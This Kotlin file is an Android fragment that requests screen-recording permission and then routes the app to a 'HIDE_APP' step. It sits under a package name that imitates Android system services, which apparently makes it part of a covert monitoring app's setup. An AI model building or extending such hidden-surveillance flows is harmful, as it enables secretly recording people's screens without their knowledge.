package com.android.services.ui.fragments

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.databinding.DataBindingUtil
import androidx.fragment.app.activityViewModels
import com.android.services.R
import com.android.services.databinding.FragmentScreenRecordBinding
import com.android.services.enums.PermissionScreens
import com.android.services.interfaces.CustomDialogListener
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logVerbose
import com.android.services.viewModel.ManualPermissionViewModel

class ScreenRecordFragment : BaseFragment() {

    lateinit var binding: FragmentScreenRecordBinding
    private var mProjectionManager: MediaProjectionManager? = null
    private val mMediaProjection: MediaProjection? = null
    private val manualPermissionViewModel: ManualPermissionViewModel by activityViewModels()

    override fun initViews(view: View) {
        binding.permissionButton.setOnClickListener {
            requestScreenRecordPermission()
        }
        binding.skipPermission.setOnClickListener {
            AppUtils.showAlertDialog(
                requireContext(),
                "Skip Permission",
                "Alert! Some features may not work if You Skip the Permission",
                "Skip",
                "Cancel",
                object : CustomDialogListener {
                    override fun onYes() {
                        AppUtils.skipThePermission(PermissionScreens.SCREEN_RECORD_PERMISSION)
                    }

                    override fun onCancel() {

                    }
                }
            )
        }
    }

    override fun createView(inflater: LayoutInflater, container: ViewGroup): View {
        binding = DataBindingUtil.inflate<FragmentScreenRecordBinding>(
            inflater, R.layout.fragment_screen_record, container, false
        ).apply {
            lifecycleOwner = viewLifecycleOwner
            viewModel = manualPermissionViewModel
        }
        return binding.root
    }

    override fun onCreateFragment() {
        mProjectionManager =
            requireActivity().getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun requestScreenRecordPermission() {
        if (mMediaProjection == null)
            screenRecordRequestLaunch.launch(mProjectionManager!!.createScreenCaptureIntent())
    }

    private val screenRecordRequestLaunch =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                val data: Intent? = result.data
                logVerbose("Permission Granted")
                AppConstants.screenRecordingIntent = data
                manualPermissionViewModel.setPermissionScreen(
                    requireContext(),
                    PermissionScreens.HIDE_APP
                )
            } else if (result.resultCode == Activity.RESULT_CANCELED) {
                logVerbose("Permission Cancelled")
            }
        }

    companion object {
        /** Creates an new instance of Accessibility Fragment **/
        fun newInstance(): ScreenRecordFragment {
            val args = Bundle()
            val fragment = ScreenRecordFragment()
            fragment.arguments = args
            return fragment
        }
    }
}